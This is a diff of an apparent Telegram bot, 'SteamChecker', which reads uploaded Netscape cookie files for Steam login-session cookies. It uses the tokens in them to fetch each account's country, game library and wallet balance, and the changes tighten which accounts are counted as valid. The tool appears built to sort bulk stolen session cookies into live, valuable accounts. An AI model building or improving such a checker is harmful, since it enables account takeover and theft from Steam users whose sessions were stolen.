@@ -22,7 +22,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ------------------------------------------------------------
-# Original SteamChecker code (unchanged)
+# Original SteamChecker code (modified for strict validation)
 # ------------------------------------------------------------
 
 G = "\033[92m"
@@ -215,7 +215,6 @@ def load_cookies(filepath):
         pass
 
     # Try to find Netscape-style cookie lines (tab-separated, at least 7 fields)
-    # This works even if there is extra text before/after.
     lines = content.splitlines()
     cookie_lines = []
     for line in lines:
@@ -230,8 +229,7 @@ def load_cookies(filepath):
                 cookie_lines.append(line)
         # Also check if line contains "steamLoginSecure" or "steamRefresh_steam" as a name
         elif 'steamLoginSecure' in line or 'steamRefresh_steam' in line:
-            # Might be a cookie line but with different separators? Try splitting by whitespace?
-            # We'll attempt to split by tabs anyway
+            # Might be a cookie line but with different separators? Try splitting by tabs anyway
             parts = line.split('\t')
             if len(parts) >= 7:
                 cookie_lines.append(line)
@@ -258,7 +256,7 @@ def load_cookies(filepath):
     return None
 
 # ------------------------------------------------------------
-# SteamChecker class (unchanged)
+# SteamChecker class with strict validation
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -369,12 +367,15 @@ class SteamChecker:
         sid_int = int(self.steamid)
 
         try:
+            # 1. Get username (optional, not required for validity)
             self.username = self.get_username_from_profile(sid_int)
             if not self.username:
                 self.username = self.steamid[:8]
 
+            # 2. Get level (optional, not required)
             self.level = self.get_level(sid_int)
 
+            # 3. Get country – REQUIRED
             cpb = struct.pack('<BQ', 0x09, sid_int)
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
@@ -383,15 +384,17 @@ class SteamChecker:
                 headers={"Content-Type": BARON_CT},
                 timeout=10
             )
-            if resp.status_code == 200:
-                data = baron_pd(resp.content)
-                cc = data.get(1, b"")
-                if isinstance(cc, bytes):
-                    cc = cc.decode()
-                self.country = BRN_MAP.get(cc, cc)
-            else:
-                self.country = "Unknown"
+            if resp.status_code != 200:
+                return False
+            data = baron_pd(resp.content)
+            cc = data.get(1, b"")
+            if not cc:
+                return False
+            if isinstance(cc, bytes):
+                cc = cc.decode()
+            self.country = BRN_MAP.get(cc, cc)
 
+            # 4. Get games – REQUIRED
             gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
@@ -403,28 +406,30 @@ class SteamChecker:
                 f"&input_protobuf_encoded={gb64}",
                 timeout=10
             )
-
-            if resp.status_code == 200:
-                data = baron_pd(resp.content)
-                self.total_games = data.get(1, 0)
-                raw_games = data.get(2, [])
-                if isinstance(raw_games, bytes):
-                    raw_games = [raw_games]
-                elif not isinstance(raw_games, list):
-                    raw_games = []
-                for g in raw_games:
-                    try:
-                        if not isinstance(g, bytes):
-                            continue
-                        gf = baron_pd(g)
-                        name = gf.get(2, b"")
-                        if isinstance(name, bytes):
-                            name = name.decode(errors="replace")
-                        if isinstance(name, str) and name.strip():
-                            self.games.append(name.strip())
-                    except:
+            if resp.status_code != 200:
+                return False
+            data = baron_pd(resp.content)
+            self.total_games = data.get(1, 0)
+            # Even if total_games is 0, we still consider it valid if we got a 200.
+            raw_games = data.get(2, [])
+            if isinstance(raw_games, bytes):
+                raw_games = [raw_games]
+            elif not isinstance(raw_games, list):
+                raw_games = []
+            for g in raw_games:
+                try:
+                    if not isinstance(g, bytes):
                         continue
+                    gf = baron_pd(g)
+                    name = gf.get(2, b"")
+                    if isinstance(name, bytes):
+                        name = name.decode(errors="replace")
+                    if isinstance(name, str) and name.strip():
+                        self.games.append(name.strip())
+                except:
+                    continue
 
+            # 5. Get balance – REQUIRED
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                 f"?access_token={self.token}",
@@ -432,41 +437,40 @@ class SteamChecker:
                 headers={"Content-Type": BARON_CT},
                 timeout=10
             )
-            if resp.status_code == 200:
-                data = baron_pd(resp.content)
-                bal = data.get(14, b"")
-                if isinstance(bal, bytes):
-                    bal = bal.decode("utf-8", errors="ignore")
-                elif isinstance(bal, int):
-                    bal = str(bal)
-                self.balance_raw = bal
-                # parse balance
-                def parse_balance(balance_str, country_code):
-                    currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
-                    symbol = ''
-                    for sym in currency_symbols:
-                        if sym in balance_str:
-                            symbol = sym
-                            break
-                    if not symbol and country_code in CURRENCY_MAP:
-                        symbol = CURRENCY_MAP[country_code]
-                    cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
-                    if ',' in cleaned and '.' not in cleaned:
-                        cleaned = cleaned.replace(',', '.')
-                    parts = cleaned.split('.')
-                    if len(parts) > 2:
-                        cleaned = parts[0] + '.' + ''.join(parts[1:])
-                    try:
-                        value = float(cleaned)
-                    except:
-                        value = 0.0
-                    return value, symbol
-                self.balance_float, self.currency = parse_balance(bal, self.country)
-            else:
-                self.balance_raw = "0"
-                self.balance_float = 0.0
-                self.currency = ''
+            if resp.status_code != 200:
+                return False
+            data = baron_pd(resp.content)
+            bal = data.get(14, b"")
+            if isinstance(bal, bytes):
+                bal = bal.decode("utf-8", errors="ignore")
+            elif isinstance(bal, int):
+                bal = str(bal)
+            self.balance_raw = bal
+            # parse balance
+            def parse_balance(balance_str, country_code):
+                currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
+                symbol = ''
+                for sym in currency_symbols:
+                    if sym in balance_str:
+                        symbol = sym
+                        break
+                if not symbol and country_code in CURRENCY_MAP:
+                    symbol = CURRENCY_MAP[country_code]
+                cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
+                if ',' in cleaned and '.' not in cleaned:
+                    cleaned = cleaned.replace(',', '.')
+                parts = cleaned.split('.')
+                if len(parts) > 2:
+                    cleaned = parts[0] + '.' + ''.join(parts[1:])
+                try:
+                    value = float(cleaned)
+                except:
+                    value = 0.0
+                return value, symbol
+            self.balance_float, self.currency = parse_balance(bal, self.country)
+            # Even if balance is 0, it's fine.
 
+            # If we reached here, all required API calls succeeded
             self.success = True
             return True
 
@@ -633,7 +637,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if has_essential:
                     all_cookies.append((cookies, filepath))
                 else:
-                    # Optional: log skipping
+                    # Skip this file (no essential cookie)
                     pass
 
         if not all_cookies:
